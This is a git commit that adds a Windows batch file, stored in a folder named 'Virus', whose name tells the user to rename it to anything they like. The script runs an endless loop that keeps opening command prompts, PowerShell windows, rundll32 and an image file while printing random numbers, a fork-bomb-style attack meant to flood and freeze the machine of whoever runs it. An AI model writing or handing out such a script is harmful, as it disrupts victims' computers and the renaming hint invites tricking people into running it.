c532d2ece5291aa0bb57b7dbeb3d25b4b2973748
KILLER <78667474+alexander695@users.noreply.github.com>
2022-01-10 21:30:15 -0800

    Add files via upload

---
+++ Virus/change the name to do you want.bat
@@ -0,0 +1,10 @@
+@echo off
+color a 
+:top
+start cmd
+echo %random%%random%%random%%random%%random%%random%%random%%random%%random%
+start Windows PowerShell
+start rundll32.exe
+C:\Downloads\Virus\Img.jpg
+
+goto top
